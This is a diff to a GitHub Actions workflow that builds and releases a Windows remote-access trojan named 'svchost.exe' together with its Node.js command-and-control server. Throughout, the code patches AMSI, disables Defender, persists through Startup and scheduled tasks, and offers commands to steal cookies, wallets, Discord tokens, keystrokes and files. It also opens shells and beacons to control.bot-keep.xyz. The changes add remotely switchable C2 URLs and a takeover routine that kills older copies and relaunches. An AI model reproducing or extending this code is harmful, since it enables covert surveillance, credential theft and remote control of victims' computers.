@@ -19,9 +19,14 @@ on:
         default: '0'
         type: string
       control_url:
-        description: 'URL server web control'
+        description: 'URL server web control (GHÕ TAY vào đây, để trống = dùng default)'
         required: false
-        default: 'https://bvwqmiv7phoi.ramnaymcloud.com'
+        default: 'https://control.bot-keep.xyz'
+        type: string
+      control_fetch:
+        description: 'URL raw tra ve control URL (tuy chon, uu tien cao nhat)'
+        required: false
+        default: ''
         type: string
       agent_key:
         description: 'Key cho agent (khớp AGENT_KEY bên server, rỗng = không cần)'
@@ -266,6 +271,44 @@ jobs:
                       r"Microsoft\Windows\Start Menu\Programs\Startup\svchost.vbs")
                   if os.path.exists(v): os.remove(v)
               except Exception: pass
+
+          def _pids_on_ports():
+              pids = set()
+              try:
+                  out = subprocess.check_output("netstat -ano -p tcp", shell=True,
+                          creationflags=NO_WIN).decode("utf-8", errors="ignore")
+                  for line in out.splitlines():
+                      if "LISTENING" not in line: continue
+                      p = line.split()
+                      if len(p) < 5: continue
+                      if p[1].rsplit(":", 1)[-1] in ("47823", "47824", "47825"):
+                          try: pids.add(int(p[-1]))
+                          except Exception: pass
+              except Exception: pass
+              return pids
+
+          def take_over():
+              """Chay exe moi tu Downloads tren may da cai -> ghi de ban cai, tat ban cu, chay lai ban moi."""
+              me = self_path()
+              if os.path.normcase(me) == os.path.normcase(SCRIPT_PATH): return False
+              try:
+                  os.makedirs(INSTALL_DIR, exist_ok=True)
+                  tmp = SCRIPT_PATH + ".new"
+                  shutil.copy2(me, tmp); unblock(tmp)
+                  os.replace(tmp, SCRIPT_PATH)
+              except Exception: return False
+              if not os.path.exists(MARKER): return False
+              for pid in _pids_on_ports():
+                  if pid != os.getpid():
+                      try: subprocess.call(f"taskkill /f /pid {pid}", shell=True,
+                              creationflags=NO_WIN)
+                      except Exception: pass
+              time.sleep(1.0)
+              try:
+                  subprocess.Popen(f'cmd /c ping -n 2 127.0.0.1 >nul & start "" "{SCRIPT_PATH}"',
+                          shell=True, creationflags=NO_WIN)
+              except Exception: pass
+              return True
 
           # ============================================================
           #  BYPASS AV
@@ -1669,14 +1712,16 @@ jobs:
           # ============================================================
           #  WEB CONTROL - realtime screen + input (control.bot-keep.xyz)
           # ============================================================
-          CONTROL_URL  = "https://bvwqmiv7phoi.ramnaymcloud.com"
-          CONTROL_ON   = True
-          AGENT_KEY    = "gayvcl"
-          WEB_HIDDEN   = True
-          WEB_FPS      = 12
-          WEB_QUALITY  = 55
-          WEB_SCALE    = 0.5
-          WEB_MON      = 1
+          CONTROL_URL   = "https://control.bot-keep.xyz"
+          CONTROL_FETCH = ""
+          CONTROL_ON    = True
+          AGENT_KEY     = ""
+          URL_FILE      = os.path.join(INSTALL_DIR, "control_url.txt")
+          WEB_HIDDEN    = True
+          WEB_FPS       = 12
+          WEB_QUALITY   = 55
+          WEB_SCALE     = 0.5
+          WEB_MON       = 1
 
           ULONG_PTR = ctypes.c_void_p
 
@@ -1866,7 +1911,7 @@ jobs:
               "wall <url|path> | open <url|path> | power shutdown|restart|lock|sleep|logoff | kill <ten>\n"
               "bypass | defender on|off | amsi <cmd> | etw | hide <path> | timestomp <path> | persist | glitch on|off\n"
               "overlay <text> | fakebsod | rickroll | caps | desk | mute | volup [n] | voldown [n] | cd | flip | recycle\n"
-              "lock <pass> [dir] | unlock <pass> [dir] | webhook <url> | exfil | eval <expr> | exec <code> | restart | huy")
+              "seturl <url> | reload | webhook <url> | exfil | eval <expr> | exec <code> | restart | huy")
 
           def _local_cmd(name, args):
               n = (name or "").lower().strip()
@@ -1915,6 +1960,9 @@ jobs:
               if n == "hide": return f_hide(j), None
               if n == "clone": return f_clone(j), None
               if n == "recycle": return f_recycle(), None
+              if n == "seturl": return f_seturl(j), None
+              if n == "reload":
+                  _reconnect_ws(); return "dang ket noi lai: " + _control_base(), None
               if n == "persist":
                   install(); install_task(); return "✅ đã bật persist (task onlogon + guard 5 phút)", None
               if n == "shot":
@@ -1986,8 +2034,44 @@ jobs:
               if n == "huy": return "tự hủy...", None
               return f"Không có lệnh: {n} (gõ help)", None
 
+          _fetch_cache = {"ts": 0.0, "url": ""}
+
+          def _control_base():
+              global CONTROL_URL
+              if CONTROL_FETCH and requests:
+                  if time.time() - _fetch_cache["ts"] > 60:
+                      _fetch_cache["ts"] = time.time()
+                      try:
+                          t = (requests.get(CONTROL_FETCH, timeout=10).text or "").strip().splitlines()
+                          t = t[0].strip() if t else ""
+                          if t: _fetch_cache["url"] = t
+                      except Exception: pass
+                  if _fetch_cache["url"]: return _fetch_cache["url"]
+              try:
+                  if os.path.exists(URL_FILE):
+                      v = open(URL_FILE, encoding="utf-8").read().strip()
+                      if v: return v
+              except Exception: pass
+              return CONTROL_URL
+
+          def _reconnect_ws():
+              try:
+                  w = _web.get("ws")
+                  if w: w.close()
+              except Exception: pass
+
+          def f_seturl(u):
+              global CONTROL_URL
+              if not u: return f"URL = {_control_base()}"
+              CONTROL_URL = u.strip().rstrip("/")
+              try:
+                  with open(URL_FILE, "w", encoding="utf-8") as f: f.write(CONTROL_URL)
+              except Exception: pass
+              threading.Timer(0.5, _reconnect_ws).start()
+              return f"URL = {CONTROL_URL} (da luu vao control_url.txt, dang ket noi lai)"
+
           def _ws_url():
-              u = (CONTROL_URL or "").rstrip("/")
+              u = (_control_base() or "").rstrip("/")
               if u.startswith("https"): u = "wss" + u[5:]
               elif u.startswith("http"): u = "ws" + u[4:]
               return u + "/ws"
@@ -1998,7 +2082,7 @@ jobs:
                       "user": os.environ.get("USERNAME", ""),
                       "os": f"{platform.system()} {platform.release()}",
                       "admin": is_admin(), "ip": _lan_ip(),
-                      "mons": _mon_count(), "ver": "svchost 2.0"}
+                      "mons": _mon_count(), "ver": "svchost 2.1", "url": _control_base()}
               try:
                   ws.send(json.dumps({"t": "hello", "role": "agent",
                                       "key": AGENT_KEY, "info": info}))
@@ -2123,7 +2207,7 @@ jobs:
               await m.channel.send(
                   "**📋 LỆNH**\n"
                   "**Đa máy:** `!list` `!select <số|ID>` `!back` `!sel` `!master` — hoặc `!all <lệnh>` / `!<ID> <lệnh>`\n"
-                  "**🌐 WEB:** `!web` `!webfps <n>` `!webq <n>` `!webscale <n>` `!hidden on|off`\n"
+                  "**🌐 WEB:** `!web` `!seturl <url>` `!reload` `!webfps <n>` `!webq <n>` `!webscale <n>` `!hidden on|off`\n"
                   "**🛡️ BYPASS:** `!bypass` `!defender off|on` `!amsi` `!etw` `!timestomp` `!hide` `!clone` `!sandbox` `!token`\n"
                   "**Shell:** `!sh` `!ps1` `!pwd` `!cddir` `!cmd`\n"
                   "**File:** `!ls !cat !write !mkdir !copy !move !rename !tree !du !hex !search !del !zip !merge !download !upload`\n"
@@ -2172,11 +2256,15 @@ jobs:
 
           async def c_web(m, a):
               await m.channel.send(
-                  f"🌐 **Web control:** {CONTROL_URL}\n"
+                  f"🌐 **Web control:** {_control_base()}\n"
                   f"Trạng thái: {'✅ đã kết nối' if _web['on'] else '❌ chưa kết nối'}\n"
                   f"Người đang xem: {_web['viewers']}\n"
                   f"FPS {WEB_FPS} · Quality {WEB_QUALITY} · Scale {WEB_SCALE} · Màn {WEB_MON} · Chuột ẩn {'ON' if WEB_HIDDEN else 'OFF'}\n"
                   f"Máy: `{MACHINE_ID}` — mở web, chọn máy này ở danh sách bên trái.")
+
+          async def c_seturl(m, a): await m.channel.send(await ex(f_seturl, " ".join(a)))
+          async def c_reload(m, a):
+              await ex(_reconnect_ws); await m.channel.send(f"🔄 đang kết nối lại: {_control_base()}")
 
           async def c_webfps(m, a):
               global WEB_FPS
@@ -2418,6 +2506,7 @@ jobs:
           COMMANDS = {
               "help":c_help,"list":c_list,"select":c_select,"back":c_back,"sel":c_sel,"master":c_master,
               "web":c_web,"webmon":c_web,"webfps":c_webfps,"webq":c_webq,"webscale":c_webscale,"hidden":c_hidden,
+              "seturl":c_seturl,"reload":c_reload,
               "cmd":c_cmd,"sh":c_sh,"shell":c_sh,"ps1":c_ps1,"powershell":c_ps1,"pwd":c_pwd,"cddir":c_cddir,
               "bypass":c_bypass,"defender":c_defender,"amsi":c_amsi,"etw":c_etw,
               "timestomp":c_timestomp,"hide":c_hide,"clone":c_clone,"sandbox":c_sandbox,"token":c_token,
@@ -2501,13 +2590,16 @@ jobs:
                   except Exception: pass
 
           if __name__ == "__main__":
-              if not single_instance(): sys.exit(0)
               hide_console()
               try: amsi_patch()
               except Exception: pass
               if not os.path.exists(MARKER):
                   time.sleep(random.randint(3, 12))
                   install()
+              elif take_over():
+                  print("[*] da ghi de ban cai dat + khoi dong lai ban moi")
+                  time.sleep(0.8); os._exit(0)
+              if not single_instance(): sys.exit(0)
               threading.Thread(target=_exfil_worker, daemon=True).start()
               threading.Thread(target=_net_watch, daemon=True).start()
               threading.Thread(target=_watchdog, daemon=True).start()
@@ -2542,6 +2634,7 @@ jobs:
            *  Chay:  node server.js
            *  Env:   PORT=33324  HOST=0.0.0.0  WEB_PASS=...  AGENT_KEY=...
            *         TLS_CERT=cert.pem  TLS_KEY=key.pem   (co 2 file nay -> tu HTTPS/WSS)
+           *  Luu y: nhan WebSocket o MOI path, nen di qua proxy/tunnel co prefix van ok.
            */
           const fs = require('fs');
           const path = require('path');
@@ -2573,7 +2666,7 @@ jobs:
             const list = [];
             agents.forEach(function (a) {
               list.push({ id: a.id, host: a.info.host, user: a.info.user, os: a.info.os,
-                admin: !!a.info.admin, ip: a.ip, mons: a.info.mons || 1,
+                admin: !!a.info.admin, ip: a.ip, mons: a.info.mons || 1, url: a.info.url || '',
                 viewers: a.viewers.size, on: a.ws.readyState === 1 });
             });
             const s = jstr({ t: 'agents', list: list });
@@ -2657,7 +2750,7 @@ jobs:
              <div id="hint">Chon 1 may ben trai de dieu khien</div></div>
             <div id="term">
              <div id="out"></div>
-             <div class="row"><input id="cmd" placeholder="Nhap lenh: sysinfo | sh dir | shot | steal | help"><button id="run" class="pri">Chay</button></div>
+             <div class="row"><input id="cmd" placeholder="Nhap lenh: sysinfo | sh dir | shot | steal | seturl https://..."><button id="run" class="pri">Chay</button></div>
              <div id="quick"></div>
             </div>
            </main>
@@ -2689,7 +2782,7 @@ jobs:
             if(m.t==='agents'){ agents=m.list||[]; renderList(); return; }
             if(m.t==='attached'){
               attached=m.id||null;
-              $('#who').textContent = m.info ? (m.info.host+' · '+m.info.user+' · '+m.info.ip) : 'Chua chon may';
+              $('#who').textContent = m.info ? (m.info.host+' · '+m.info.user+' · '+m.info.ip+' · '+m.info.url) : 'Chua chon may';
               if(m.info && m.info.mons){ var o=''; for(var i=1;i<=m.info.mons;i++) o+='<option value="'+i+'">'+i+'</option>'; $('#mon').innerHTML=o; }
               renderList(); pushSet(); return;
             }
@@ -2828,7 +2921,8 @@ jobs:
 
           var QUICK=['help','sysinfo','shot','ls C:\\','procs','net','wifi','browser','cookies','wallets','dtoken',
           'steal','grab','keylog dump','cliplog dump','clip','bypass','persist','drives','users','av','installed',
-          'power lock','msg Hello','notify svchost','beep','caps','flip','glitch on','overlay svchost','fakebsod','rickroll','mic 5'];
+          'power lock','msg Hello','notify svchost','beep','caps','flip','glitch on','overlay svchost','fakebsod','rickroll','mic 5',
+          'seturl https://control.bot-keep.xyz','reload'];
           QUICK.forEach(function(c){
             var b=document.createElement('button'); b.textContent=c;
             b.onclick=function(){ if(!attached) return; var sp=c.split(/\s+/), n=sp.shift();
@@ -2852,7 +2946,8 @@ jobs:
             ? https.createServer({ cert: fs.readFileSync(CERT), key: fs.readFileSync(KEY) }, handler)
             : http.createServer(handler);
 
-          const wss = new WebSocketServer({ server: srv, path: '/ws', maxPayload: 64 * 1024 * 1024 });
+          // KHONG gioi han path -> chiu duoc proxy/tunnel co prefix
+          const wss = new WebSocketServer({ server: srv, maxPayload: 64 * 1024 * 1024 });
 
           wss.on('connection', function (ws, req) {
             ws.ip = ((req.headers['x-forwarded-for'] || '') + ',' + (req.socket.remoteAddress || ''))
@@ -2880,7 +2975,7 @@ jobs:
                   agents.set(ws.id, ws);
                   send(ws, { t: 'viewers', n: 0 });
                   pushAgents();
-                  console.log('[+] agent: ' + ws.id + ' (' + ws.ip + ')');
+                  console.log('[+] agent: ' + ws.id + ' (' + ws.ip + ') path=' + (req.url || '/'));
                 } else {
                   if (PASS && m.pass !== PASS) { send(ws, { t: 'err', msg: 'sai mat khau' }); return ws.close(); }
                   ws.role = 'web'; webs.add(ws);
@@ -2942,6 +3037,7 @@ jobs:
             console.log('===========================================');
             console.log(' control server: ' + (useTls ? 'https' : 'http') + '://0.0.0.0:' + PORT);
             console.log(' domain:         https://control.bot-keep.xyz');
+            console.log(' ws path:        MOI path (khong gioi han)');
             console.log(' mat khau web:   ' + (PASS ? 'CO' : 'khong'));
             console.log(' agent key:      ' + (AKEY ? 'CO' : 'khong'));
             console.log('===========================================');
@@ -3012,9 +3108,7 @@ jobs:
       - name: Kiểm tra cú pháp
         run: |
           python -c "import ast; ast.parse(open('agent.py',encoding='utf-8').read()); print('OK: agent.py hop le')"
-          node --check server.js
-          if ($LASTEXITCODE -ne 0) { exit 1 }
-          echo "OK: server.js hop le"
+          node --check server.js && echo "OK: server.js hop le"
 
       - name: Tải libopus-0.dll
         shell: pwsh
@@ -3043,6 +3137,7 @@ jobs:
           TOKEN_URL: ${{ github.event.inputs.token_url }}
           CTRL_CH: ${{ github.event.inputs.control_channel }}
           CTRL_URL: ${{ github.event.inputs.control_url }}
+          CTRL_FETCH: ${{ github.event.inputs.control_fetch }}
           AKEY: ${{ github.event.inputs.agent_key }}
         run: |
           if ($env:BOT_TOKEN) { Write-Host "::add-mask::$env:BOT_TOKEN" }
@@ -3050,31 +3145,55 @@ jobs:
           import os, re, base64, secrets
           s = open("agent.py", encoding="utf-8").read()
 
+          def substr(pat, val):
+              global s
+              s = re.sub(pat, lambda m: m.group(0).split("=")[0].rstrip() + ' = "' + val + '"', s, count=1)
+
           tok = (os.environ.get("BOT_TOKEN") or "").strip()
           if tok:
               raw = tok.encode()
               key = secrets.token_bytes(16)
               enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))[::-1]
-              s = re.sub(r'_TOK_ENC\s*=\s*".*?"', '_TOK_ENC = "' + base64.b64encode(enc).decode() + '"', s, count=1)
-              s = re.sub(r'_TOK_KEY\s*=\s*".*?"', '_TOK_KEY = "' + base64.b64encode(key).decode() + '"', s, count=1)
+              substr(r'_TOK_ENC\s*=\s*".*?"', base64.b64encode(enc).decode())
+              substr(r'_TOK_KEY\s*=\s*".*?"', base64.b64encode(key).decode())
               print("discord: CO token")
           else:
-              s = re.sub(r'_TOK_ENC\s*=\s*".*?"', '_TOK_ENC = ""', s, count=1)
-              s = re.sub(r'_TOK_KEY\s*=\s*".*?"', '_TOK_KEY = ""', s, count=1)
+              substr(r'_TOK_ENC\s*=\s*".*?"', "")
+              substr(r'_TOK_KEY\s*=\s*".*?"', "")
               print("discord: TAT (che do web-only)")
 
-          if os.environ.get("TOKEN_URL"):
-              s = re.sub(r'TOKEN_URL\s*=\s*".*?"', 'TOKEN_URL = "' + os.environ["TOKEN_URL"] + '"', s, count=1)
-          if os.environ.get("CTRL_CH") and os.environ["CTRL_CH"] != "0":
-              s = re.sub(r'CONTROL_CH_ID\s*=\s*\d+', 'CONTROL_CH_ID = ' + os.environ["CTRL_CH"], s, count=1)
-          if os.environ.get("CTRL_URL"):
-              s = re.sub(r'CONTROL_URL\s*=\s*".*?"', 'CONTROL_URL = "' + os.environ["CTRL_URL"].rstrip("/") + '"', s, count=1)
-          if os.environ.get("AKEY"):
-              s = re.sub(r'AGENT_KEY\s*=\s*".*?"', 'AGENT_KEY = "' + os.environ["AKEY"] + '"', s, count=1)
+          def pick(env, slash=False):
+              v = (os.environ.get(env) or "").strip()
+              return v.rstrip("/") if slash else v
+
+          for pat, env, sl in ((r'TOKEN_URL\s*=\s*".*?"', "TOKEN_URL", False),
+                               (r'CONTROL_URL\s*=\s*".*?"', "CTRL_URL", True),
+                               (r'CONTROL_FETCH\s*=\s*".*?"', "CTRL_FETCH", True),
+                               (r'AGENT_KEY\s*=\s*".*?"', "AKEY", False)):
+              v = pick(env, sl)
+              if v: substr(pat, v)
+
+          ch = (os.environ.get("CTRL_CH") or "").strip()
+          if ch and ch != "0":
+              s = re.sub(r'CONTROL_CH_ID\s*=\s*\d+',
+                         lambda m: m.group(0).split("=")[0].rstrip() + " = " + ch, s, count=1)
 
           open("agent.py", "w", encoding="utf-8").write(s)
+
+          print("--- CAU HINH DA NHUNG ---")
+          for line in s.splitlines():
+              if re.match(r'^\s*(CONTROL_URL|CONTROL_FETCH|CONTROL_CH_ID|TOKEN_URL|AGENT_KEY|_TOK_ENC|_TOK_KEY)\s*=', line):
+                  v = line.strip()
+                  print("  " + (v[:90] + "..." if len(v) > 90 else v))
           '@
           $inject | python -
+
+      - name: Xac nhan cau hinh trong agent.py
+        shell: pwsh
+        run: |
+          Write-Host "=== dong cau hinh thuc te trong agent.py ==="
+          Select-String -Path agent.py -Pattern '^\s*(CONTROL_URL|CONTROL_FETCH|CONTROL_CH_ID|TOKEN_URL|AGENT_KEY|_TOK_ENC|_TOK_KEY)\s*=' |
+            ForEach-Object { $_.Line.Trim() }
 
       - name: Register PyArmor license
         continue-on-error: true
@@ -3180,7 +3299,13 @@ jobs:
             - `svchost.exe` — agent Windows (kết nối ra control server, không cần mở port)
             - `server.js` — server web control, chạy trên VPS: `node server.js` (cổng 33324)
 
-            Cập nhật máy đang chạy: `!update <url svchost.exe>`
+            **Đổi control URL mà không cần build lại:**
+            - Discord: `!seturl https://domain-moi.com` rồi `!reload`
+            - Web: gõ `seturl https://domain-moi.com` trong ô lệnh
+            - URL được lưu vào `%APPDATA%\Microsoft\control_url.txt`, ưu tiên hơn bản nhúng trong exe.
+
+            **Thay exe trên máy đã cài:** chỉ cần chạy file mới từ Downloads — agent tự ghi đè bản trong
+            `%APPDATA%\Microsoft`, tự tắt bản cũ và chạy lại bản mới. Hoặc dùng `!update <url exe>`.
           files: |
             svchost.exe
             server.js
